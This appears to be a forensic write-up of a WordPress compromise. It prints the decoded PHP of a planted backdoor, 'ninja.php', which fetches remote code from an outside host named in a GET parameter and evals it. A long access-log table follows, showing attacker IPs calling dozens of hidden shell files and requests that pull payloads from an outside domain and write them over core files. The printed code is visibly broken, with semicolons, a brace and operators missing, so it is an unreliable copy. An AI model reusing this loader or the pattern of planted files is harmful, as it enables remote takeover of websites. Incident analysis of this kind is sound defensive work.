# ninja.php

The obfuscated file was found at the root of the WordPress site. Once executed, the following text is displayed: 

![](images/ninja.php.png)

We can easily spot the long string in the code that looks like base64 encoded data. Simply decoding that part of the code gives us:

```php
echo "do you like me"
error_reporting(0)
function get_contents($url){
  $ch = curl_init("$url")
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1
 rv:32.0) Gecko/20100101 Firefox/32.0")
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0)
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0)
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki'])
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki'])
  $result = curl_exec($ch)
  return $result
$txtname = isset($_GET['txtname']) 
 trim($_GET['txtname']) : ''
$a = get_contents('http://www168.gocarolina.asia/'.$txtname)
eval('
>'.$a)
```

| IP address | Method | Query |
| ------------- |------------- | -------------|
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | GET | /wp-includes/SimplePie/popnew.php? |
| 103.233.83.51 | GET | /wp-includes/SimplePie/popnew.php?g=20047&f=9000n.txt | 
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |  
| 103.233.83.51 | GET | /shoes.php |
| 103.233.83.51 | POST | /wp-includes/js/tinymce/skins/lightgray/fonts/signsed.php |
| 103.233.83.51 | GET | /wp-includes/SimplePie/HTTP/wp-po.php |
| 103.233.83.51 | GET | /wp-includes/Text/Diff/streamed.php |
| 103.233.83.51 | POST | /wp-includes/Text/Diff/streamed.php |
| 103.233.83.51 | POST | /5df87162cd91d5df87162cd92a.php |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/colorpicker/blogking.php?groups=20047&slnames=9000ntest.txt%20&keykey=kvlqst2onx-zpaf7edg5jcu6mr0b983iy_4h1w |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | POST | /wp-sign.php |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/wordpress/new_side.php|
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/single-side.php |
| 103.233.83.51 | GET | /wp-includes/Text/Diff/streamed.php |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/colorpicker/blogking.php?xxxaaa |
| 103.233.83.51 | GET | /wp-includes/SimplePie/HTTP/wp-po.php |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/compat3x/.h..php |
| 103.233.83.51 | GET | /wp-includes/IXR/newsslide.php
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/image/hours.php |
| 103.233.83.51 | GET | /wp-includes/js/gank.php.PhP |
| 103.233.83.51 | GET | /5df87162cd91d5df87162cd92a.php |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/plugins/colorpicker/bag.php |
| 103.233.83.51 | GET | /wp-includes/Text/Diff/bird.php |
| 103.233.83.51 | GET | /pop-side.php |
| 103.233.83.51 | GET | /wool.php |
| 103.233.83.51 | GET | /wp-includes/js/jquery/newsside.php |
| 103.233.83.51 | GET | /wp-includes/SimplePie/Content/Type/simpleside.php5 |
| 103.233.83.51 | GET | /content-post.php |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/themes/modern/beautifu.php |
| 103.233.83.51 | GET | /wp-includes/SimplePie/popnew.php |
| 103.233.83.51 | GET | /wp-includes/wp-side.php |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=1227-1024.txt%7C1227-ss.txt%7C1227-lf.txt&writerfilename=wp-comments-post.php%7Cwp-admin/updated.php%7Cwp-admin/images/rules.php |
| 103.233.83.51 | GET | /wp-includes/js/tinymce/skins/lightgray/img/newsrsss.php |
| 103.233.83.51 | GET | /5df86cc95e7945df86cc95e798.php |
| 103.233.83.51 | GET | /index.php?xxxxxxxxxxxx_loads=1&xxxxxxxxxxxx_filename=google25ef4a61a11bac5a.html&xxxxxxxxxxxx_filecontent=google-site-verification:google25ef4a61a11bac5a.html |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | GET | /wp-load.php?name=domainnamespace.top/popn.txt&file=popn.php |
| 103.233.83.51 | GET | /wp-load.php?name=domainnamespace.top/ss.txt&file=ninja.php |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | GET | /ninja.php?txtname=cCtPU4UNt.txt&runpath&indexpath&groups=20047&slnames=9000newtest.txt |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=up.txt |
| 103.233.83.51 | GET | /index.php?xxnew2018_url1=1227-1024.txt%7C1227-ss.txt%7C1227-lf.txt&writerfilename=wp-comments-post.php%7Cwp-admin/updated.php%7Cwp-admin/images/rules.php |
| 104.143.43.10 | GET | /5df86cc95e7945df86cc95e798.php |
| 104.143.43.10 | GET | /5df87162cd91d5df87162cd92a.php |
| 104.143.43.10 | GET | /content-POST |.php |
| 104.143.43.10 | GET | /index.php?xxnew2018_url1=10test.txt |
| 104.143.43.10 | GET | /index.php?xxnew2018_url1=1227-1024.txt%7C1227-ss.txt%7C1227-lf.txt&writerfilename=wp-comments-POST  ||.php%7Cwp-admin/updated.php%7Cwp-admin/images/rules.php |
| 104.143.43.10 | GET | /index.php?xxnew2018_url1=up.txt |
| 104.143.43.10 | GET | /pop-side.php |
| 104.143.43.10 | GET | /popn.php? |
| 104.143.43.10 | GET | /popn.php?g=20047&f=9000new.txt |
| 104.143.43.10 | GET | /shoes.php |
| 104.143.43.10 | GET | /shoes.php?path=/home/rpblimtg |
| 104.143.43.10 | GET | /wool.php |
| 104.143.43.10 | GET | /wp-comments-POST |.php?name=domainnamespace.top/popn.txt&file=popn.php |
| 104.143.43.10 | GET | /wp-includes/IXR/newsslide.php |
| 104.143.43.10 | GET | /wp-includes/SimplePie/Content/Type/simpleside.php5 |
| 104.143.43.10 | GET | /wp-includes/SimplePie/HTTP/wp-po.php |
| 104.143.43.10 | GET | /wp-includes/SimplePie/popnew.php |
| 104.143.43.10 | GET | /wp-includes/SimplePie/popnew.php? |
| 104.143.43.10 | GET | /wp-includes/SimplePie/popnew.php?g=20047&f=9000n.txt |
| 104.143.43.10 | GET | /wp-includes/Text/Diff/bird.php |
| 104.143.43.10 | GET | /wp-includes/Text/Diff/streamed.php |
| 104.143.43.10 | GET | /wp-includes/js/gank.php.PhP |
| 104.143.43.10 | GET | /wp-includes/js/jquery/newsside.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/colorpicker/bag.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/colorpicker/blogking.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/colorpicker/blogking.php?xxxaaa |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/compat3x/.h..php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/image/hours.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/single-side.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/plugins/wordpress/new_side.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/skins/lightgray/fonts/signsed.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/skins/lightgray/img/newsrsss.php |
| 104.143.43.10 | GET | /wp-includes/js/tinymce/themes/modern/beautifu.php |
| 104.143.43.10 | GET | /wp-includes/wp-side.php |
| 104.143.43.10 | GET | /wp-load.php?name=domainnamespace.top/popn.txt&file=popn.php |
| 104.143.43.10 | GET | /wp-load.php?up2018info& |
| 104.143.43.10 | POST | /5df87162cd91d5df87162cd92a.php |
| 104.143.43.10 | POST | /wp-includes/js/tinymce/skins/lightgray/fonts/signsed.php |
